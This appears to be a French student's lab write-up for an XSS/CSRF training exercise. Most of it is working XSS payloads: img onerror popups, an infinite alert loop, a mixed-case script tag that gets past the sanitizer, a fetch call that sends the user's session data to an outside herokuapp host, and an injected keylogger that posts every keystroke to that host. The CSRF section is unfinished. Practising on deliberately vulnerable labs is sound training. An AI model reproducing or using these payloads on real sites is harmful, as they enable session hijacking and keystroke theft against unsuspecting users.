# XSS-CSRF
https://xss-csrf-tp.herokuapp.com/men
## Partie 1 - XSS

### Level 1 : 
Pour ce niveau, j’ai décidé d’intégrer une image dans l’URL qui affiche un message d’erreur  si elle n’est pas trouvée → une popup d’erreur s’affiche https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%22alert%22%20onerror=%22alert(%27danger%27)%22%3E 

### Level 2 :
* Pour ce niveau,  j’ai repris ma démarche précédente en insérant <img src="alert" onerror="alert('danger')"> dans le champ titre du formulaire ainsi l’image qui doit être affiché n’est pas trouvée → une popup d’erreur s’affiche par contre <script>alert(‘danger’)</script> ne fonctionne pas
* On dirait que le navigateur protége le site en effectuant un genre d’escape
* L’API Fetch de JS effectue une requete asynchrone en utilisant un appel AJAX pour recuperer les données
* La solution que je prefere est <img src="danger" onerror="while(true) { alert(‘danger’); }">
* Pour envoyer sur heroku la session de l’utilisateur de maniere invicible, j’utilise : <img src="danger" onerror="fetch('https://website-alex.herokuapp.com/', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({sessionName: sessionStorage.SessionName, session: sessionStorage.getItem('SESSIONDANGER')})})">

### Level 3 :
* Pour rusez le bypass du sanitizer, j’ai simplement ajouter des majuscule dans les balise script ainsi les scripts sont ajouté dans le DOM
* Pour faire un keylogger en JS qui envoie les données sur heroku : <sCript>document.addEventListener('keypress', function(event) { console.log(String.fromCharCode( event.which )); fetch('https://website-alex.herokuapp.com/', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({keypressed: String.fromCharCode( event.which )})})}); </sCript>

## Partie 2 - CSRF

En construction
